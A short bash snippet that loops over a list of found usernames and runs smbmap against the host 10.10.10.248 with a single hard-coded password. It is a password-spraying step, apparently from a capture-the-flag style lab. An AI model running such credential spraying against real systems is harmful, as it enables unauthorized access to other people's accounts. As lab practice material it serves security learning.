while read user; do
	echo "----------------------"
	echo "Testing with $user"
	smbmap -u "$user" -p NewIntelligenceCorpUser9876 -H 10.10.10.248
done < Found_Users.txt
